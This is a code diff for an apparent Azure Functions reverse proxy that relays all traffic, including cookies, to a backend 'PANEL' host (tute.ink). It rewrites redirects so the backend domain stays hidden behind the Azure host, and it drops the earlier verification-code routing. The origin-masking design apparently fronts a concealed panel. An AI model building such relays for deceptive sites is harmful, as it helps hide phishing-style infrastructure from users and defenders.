@@ -3,29 +3,20 @@ const PANEL = 'tute.ink';
 module.exports = async function (context, req) {
     let path = req.headers['x-ms-original-url'] || req.url || '/';
     try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
-    
     path = path.replace(/^\/api\/proxy/, '') || '/';
     if (!path.startsWith('/')) path = '/' + path;
 
-    const parts = path.split('/').filter(Boolean);
-    let code = '';
-
-    // Extract code from POST body (from fetch), query, or URL
-    if (req.body && req.body.code) {
-        code = req.body.code;
-    } else if (req.query && req.query.code) {
-        code = req.query.code;
-    } else if (parts.length >= 2) {
-        code = parts[1];
-    } else if (parts.length === 1) {
-        code = parts[0];
+    if (req.query && Object.keys(req.query).length > 0) {
+        const qs = new URLSearchParams(req.query).toString();
+        if (!path.includes('?')) path += '?' + qs;
     }
 
-    if (code) {
-        path = `/verify/${code}`;
+    if (path.startsWith('/cdn-cgi/')) {
+        context.res = { status: 404, body: '' };
+        return;
     }
 
-    context.log(`Forwarding ${req.method} to: ${path}`);
+    context.log('Forwarding to:', path);
 
     const forwardHeaders = {
         'Host': PANEL,
@@ -43,43 +34,34 @@ module.exports = async function (context, req) {
     }
 
     try {
-        let currentUrl = `https://${PANEL}${path}`;
-        let r;
+        const r = await fetch(`https://${PANEL}${path}`, {
+            method: req.method,
+            headers: forwardHeaders,
+            body: body,
+            redirect: 'manual'
+        });
 
-        // Follow redirects (Flask 302 to /l/CODE)
-        for (let hop = 0; hop < 5; hop++) {
-            r = await fetch(currentUrl, {
-                method: req.method,
-                headers: forwardHeaders,
-                body: body,
-                redirect: 'manual'
-            });
-
-            const loc = r.headers.get('location');
-            if (r.status >= 300 && r.status < 400 && loc) {
-                let finalUrl = new URL(loc, currentUrl).toString();
-                finalUrl = finalUrl.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${PANEL}`);
-                currentUrl = finalUrl;
-                req.method = 'GET';
-                body = undefined;
-                continue;
-            }
-            break;
-        }
-
-        let responseBody = await r.text();
+        const responseBody = await r.text();
         const contentType  = r.headers.get('content-type') || 'text/html';
+
+        let location = r.headers.get('location') || '';
+        if (location.startsWith('https://www.tute.ink') || location.startsWith('https://tute.ink')) {
+            const azureHost = req.headers['host'] || context.req.headers['host'];
+            location = location.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${azureHost}`);
+        }
 
         const respHeaders = {
             'Content-Type': contentType,
             'Access-Control-Allow-Origin': '*',
+            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
+            'Access-Control-Allow-Headers': 'Content-Type, Authorization',
             'Cache-Control': 'no-store, no-cache, must-revalidate'
         };
-        
+        if (location) respHeaders['Location'] = location;
         const setCookie = r.headers.get('set-cookie');
         if (setCookie) respHeaders['Set-Cookie'] = setCookie;
 
-        context.res = { status: 200, headers: respHeaders, body: responseBody };
+        context.res = { status: r.status, headers: respHeaders, body: responseBody };
     } catch (e) {
         context.log('Error:', e.message);
         context.res = { status: 500, body: 'Proxy Error: ' + e.message };
